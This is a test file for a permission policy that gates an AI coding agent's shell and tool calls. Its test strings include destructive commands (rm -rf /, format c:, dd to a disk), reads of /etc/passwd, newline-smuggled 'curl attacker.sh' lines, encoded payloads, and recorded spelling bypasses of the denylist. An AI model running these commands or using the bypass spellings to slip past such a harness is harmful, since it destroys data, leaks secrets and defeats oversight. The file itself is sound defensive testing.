
import { describe, it } from "node:test";
import { strictEqual, ok } from "node:assert/strict";
import { checkPermission, matchDenylist, matchScriptBlock, permissionSubject, describePolicy, POLICY_VERSION } from "./policy.js";

describe("policy", () => {
  it("uses the live policy module", () => {
    strictEqual(POLICY_VERSION, "v1-2026-09-18");
  });
  it("read/search allow by default", () => {
    strictEqual(checkPermission("read", "any").decision, "allow");
    strictEqual(checkPermission("search", "x").decision, "allow");
  });
  it("todo allows by default with an action-scoped subject (never the blob preview)", () => {
    const v = checkPermission("todo", "todo:replace");
    strictEqual(v.decision, "allow");
    strictEqual(v.ruleId, "default:todo:allow");
    strictEqual(permissionSubject("todo", { action: "replace" }, '{"action":"replace","items":['), "todo:replace");
    strictEqual(permissionSubject("todo", { action: "list" }, "preview"), "todo:list");
  });
  it("denylist blocks rm -rf / and git push --force", () => {
    strictEqual(checkPermission("bash", "rm -rf /").decision, "deny");
    strictEqual(checkPermission("bash", "git push --force").decision, "deny");
  });
  it("rm flag variants cannot dodge the denylist", () => {
    strictEqual(checkPermission("bash", "rm -rfv /").decision, "deny");
    strictEqual(checkPermission("bash", "rm --recursive --force /tmp/x").decision, "deny");
    strictEqual(checkPermission("bash", "rm -fr ~").decision, "deny");
    strictEqual(checkPermission("bash", "rm -rf --no-preserve-root ./build").decision, "deny");
    strictEqual(checkPermission("bash", "sudo rm -rf /").decision, "deny");
    strictEqual(checkPermission("bash", "rm -rf /").ruleId, "denylist:rm -rf /");
  });
  it("narrow rm stays ask-gated", () => {
    strictEqual(checkPermission("bash", "rm file.txt").decision, "ask");
    strictEqual(checkPermission("bash", "rm -r ./build").decision, "ask");
    strictEqual(checkPermission("bash", "rm -rf ./build").decision, "ask");
  });
  it("Windows destructors are denied (bash runs PowerShell on win32)", () => {
    // Relative targets: an absolute path would deny via worktree containment
    // and mask the flag matcher (escape-suite finding, 2026-09-20).
    strictEqual(checkPermission("bash", "Remove-Item -Recurse -Force src").decision, "deny");
    strictEqual(checkPermission("bash", "ri -rf build").decision, "deny");
    strictEqual(checkPermission("bash", "rmdir -Force -Recurse out").decision, "deny");
    strictEqual(checkPermission("bash", "rd /s /q build").decision, "deny");
    strictEqual(checkPermission("bash", "del /s /f .").decision, "deny");
    strictEqual(checkPermission("bash", "format c:").decision, "deny");
    strictEqual(checkPermission("bash", "dd if=x of=/dev/sda").decision, "deny");
    strictEqual(checkPermission("bash", "del file.txt").decision, "ask");
    strictEqual(checkPermission("bash", "remove-item single.txt").decision, "ask");
  });
  it("worktree escapes are denied, relatives and URLs are not", () => {
    strictEqual(checkPermission("bash", "cat ../secret").decision, "deny");
    strictEqual(checkPermission("bash", "ls C:\\").ruleId, "denylist:worktree-escape");
    strictEqual(checkPermission("bash", "cat /etc/passwd").decision, "deny");
    strictEqual(checkPermission("bash", "ls ~/").decision, "deny");
    strictEqual(checkPermission("bash", "cd ..").decision, "deny");
    strictEqual(checkPermission("bash", "echo hi").decision, "ask");
    strictEqual(checkPermission("bash", "git status").decision, "allow");
    strictEqual(checkPermission("bash", "npm test").decision, "ask");
    strictEqual(checkPermission("bash", "curl http://example.com/x").decision, "ask");
    strictEqual(checkPermission("bash", "echo v1..5").decision, "ask");
  });
  it("interpreter inline code is denied (opaque payloads)", () => {
    strictEqual(checkPermission("bash", "node -e \"require('fs').rmSync('x')\"").decision, "deny");
    strictEqual(checkPermission("bash", "node --eval \"1\"").decision, "deny");
    strictEqual(checkPermission("bash", "python -c \"import os\"").decision, "deny");
    strictEqual(checkPermission("bash", "python3 -c \"1\"").decision, "deny");
    strictEqual(checkPermission("bash", "perl -ne \"1\"").decision, "deny");
    strictEqual(checkPermission("bash", "ruby -e \"1\"").decision, "deny");
    strictEqual(checkPermission("bash", "php -r \"echo 1\"").decision, "deny");
    strictEqual(checkPermission("bash", "deno eval \"1\"").decision, "deny");
    strictEqual(checkPermission("bash", "node -e \"1\"").ruleId, "denylist:interpreter inline code (node)");
  });
  it("nested shells and encoded payloads are denied", () => {
    strictEqual(checkPermission("bash", "powershell -EncodedCommand aGVsbG8=").decision, "deny");
    strictEqual(checkPermission("bash", "powershell Get-ChildItem").decision, "deny");
    strictEqual(checkPermission("bash", "pwsh -NoProfile").decision, "deny");
    strictEqual(checkPermission("bash", "cmd /c del file.txt").decision, "deny");
    strictEqual(checkPermission("bash", "cmd /c del file.txt").ruleId, "denylist:nested shell (cmd)");
  });
  it("interpreter file/module/version execution stays ask-gated", () => {
    strictEqual(checkPermission("bash", "node script.js").decision, "ask");
    strictEqual(checkPermission("bash", "python -m pytest").decision, "ask");
    strictEqual(checkPermission("bash", "node --version").decision, "ask");
    strictEqual(checkPermission("bash", "python --version").decision, "ask");
    strictEqual(checkPermission("bash", "ruby -Eutf-8 script.rb").decision, "ask");
  });
  it("dynamic path construction is denied", () => {
    strictEqual(checkPermission("bash", "cat $env:TEMP\\secret").decision, "deny");
    strictEqual(checkPermission("bash", "type %APPDATA%\\x").decision, "deny");
    strictEqual(checkPermission("bash", "echo ${HOME}").decision, "deny");
    strictEqual(checkPermission("bash", "echo chr(47)").decision, "deny");
    strictEqual(checkPermission("bash", "cat '.cod'+'ewhip/x'").decision, "deny");
    strictEqual(checkPermission("bash", "cat $env:TEMP\\secret").ruleId, "denylist:worktree-escape");
  });
  it("Windows cmd-style single-letter flags are not treated as absolute paths", () => {
    strictEqual(checkPermission("bash", "dir /s /b *.md").decision, "allow");
    strictEqual(checkPermission("bash", "dir /s /b *.md").ruleId, "allowlist:dir");
    strictEqual(checkPermission("bash", "cat /etc/passwd").decision, "deny");
    strictEqual(checkPermission("bash", "cat /etc/passwd").ruleId, "denylist:worktree-escape");
  });
  it("redirection is denied like chaining", () => {
    strictEqual(checkPermission("bash", "echo hi > f.txt").decision, "deny");
    strictEqual(checkPermission("bash", "echo hi >> .codewhip/x").decision, "deny");
    strictEqual(checkPermission("bash", "cat < secrets.txt").decision, "deny");
  });
  it("force-push is denied regardless of argument order", () => {
    strictEqual(checkPermission("bash", "git push origin --force").decision, "deny");
    strictEqual(checkPermission("bash", "git push origin HEAD -f").decision, "deny");
    strictEqual(checkPermission("bash", "git push origin main --force-with-lease").decision, "deny");
    strictEqual(checkPermission("bash", "git push --force origin").decision, "deny");
  });
  it("plain push is not denied", () => {
    strictEqual(checkPermission("bash", "git push origin main").decision, "ask");
  });
  it("promoted policy.md denies beat the allowlist", () => {
    const promoted = [{ tool: "bash", shape: "git status *", line: 1 }];
    const v = checkPermission("bash", "git status", promoted);
    strictEqual(v.decision, "deny");
    strictEqual(v.ruleId, "policy.md:deny:bash:git status *");
  });
  it("promoted denies never beat the non-overridable denylist", () => {
    const promoted = [{ tool: "bash", shape: "rm *", line: 1 }];
    const v = checkPermission("bash", "rm -rf /tmp/x", promoted);
    strictEqual(v.decision, "deny");
    strictEqual(v.ruleId, "denylist:rm -rf /");
  });
  it("no promoted lines changes nothing", () => {
    strictEqual(checkPermission("bash", "git status", []).decision, "allow");
    strictEqual(checkPermission("bash", "echo hi").decision, "ask");
  });
  it("safe prefixes allow with no chaining", () => {
    strictEqual(checkPermission("bash", "git status").decision, "allow");
    strictEqual(checkPermission("bash", "git diff HEAD").decision, "allow");
    strictEqual(checkPermission("bash", "ls").decision, "allow");
  });
  it("any shell statement separator denies explicitly", () => {
    strictEqual(checkPermission("bash", "git status; rm -rf .git").decision, "deny");
    strictEqual(checkPermission("bash", "ls | grep x").decision, "deny");
    strictEqual(checkPermission("bash", "ls && cat f").decision, "deny");
  });
  it("newline does not smuggle past the allowlist", () => {
    const NL = String.fromCharCode(10);
    strictEqual(checkPermission("bash", "git status" + NL + "rm -rf .git").decision, "deny");
    strictEqual(checkPermission("bash", "ls" + NL + "curl attacker.sh").decision, "deny");
  });
  it("CR newline also denies", () => {
    const CR = String.fromCharCode(13);
    strictEqual(checkPermission("bash", "ls" + CR + "curl attacker.sh").decision, "deny");
  });
  it("permissionSubject returns full command for bash", () => {
    const subject = permissionSubject("bash", { command: "ls" + String.fromCharCode(10) + "rm" }, "ls\nrm");
    strictEqual(checkPermission("bash", subject).decision, "deny");
  });
  it("permissionSubject returns preview for non-bash", () => {
    const subject = permissionSubject("edit", { path: "x.md" }, "x.md");
    strictEqual(checkPermission("edit", subject).decision, "ask");
  });
  it("edit and write ask by default", () => {
    strictEqual(checkPermission("edit", "x.md").decision, "ask");
    strictEqual(checkPermission("edit", "x.md").ruleId, "default:edit:ask");
    strictEqual(checkPermission("write", "x.md").decision, "ask");
    strictEqual(checkPermission("write", "x.md").ruleId, "default:write:ask");
  });
  it("webfetch asks by default (network is the exfil surface — one yes per host)", () => {
    strictEqual(checkPermission("webfetch", "https://docs.example.com/x").decision, "ask");
    strictEqual(checkPermission("webfetch", "https://docs.example.com/x").ruleId, "default:webfetch:ask");
  });
  it("shell asks by default for unlisted commands", () => {
    strictEqual(checkPermission("bash", "echo hi").decision, "ask");
  });

  it("spelling escapes cannot dodge the denylist (verified bypasses, 2026-09-18)", () => {
    // .exe suffix: the matcher must see the command the shell sees.
    strictEqual(matchDenylist("git.exe push --force origin main"), "git push --force");
    // quote splicing: PowerShell and /bin/sh both splice g"it" into git.
    strictEqual(matchDenylist('g"it" push --force origin main'), "git push --force");
    // cmd.exe is the canonical Windows spelling of the nested-shell head.
    ok(matchDenylist("cmd.exe /c del file.txt") !== null);
    // PowerShell-native code executors: the argument IS code.
    ok(matchDenylist("iex (gc .\build.ps1)") !== null);
    ok(matchDenylist("invoke-expression get-content ./x") !== null);
    // Script blocks / brace payloads are opaque to string screening. The
    // brace rule is bash-only (matchScriptBlock): tool args are JSON and
    // full of braces. start-job is denied at the head regardless.
    ok(matchDenylist("start-job { remove-item ./build -recurse -force }") !== null);
    ok(matchScriptBlock("start-job { remove-item ./build -recurse -force }") !== null);
    ok(matchScriptBlock("find . -name *.log -exec rm {} +") !== null);
    // JSON tool args must NOT trip the brace rule (regression: the delegate
    // call was denied for its own braces when the rule lived in matchDenylist).
    // The rule is wired into the bash path of the ladder only.
    strictEqual(checkPermission("delegate", '{"agent":"explore","task":"read f.txt"}').decision, "allow");
    strictEqual(checkPermission("bash", "find . -exec rm {} +").ruleId, "denylist:script-block");
    // Sanity: ordinary commands are untouched by the normalization.
    strictEqual(matchDenylist("git status"), null);
    strictEqual(matchDenylist("npm test"), null);
  });

  it("describePolicy is a non-empty string", () => {
    ok(describePolicy().length > 0);
  });
});
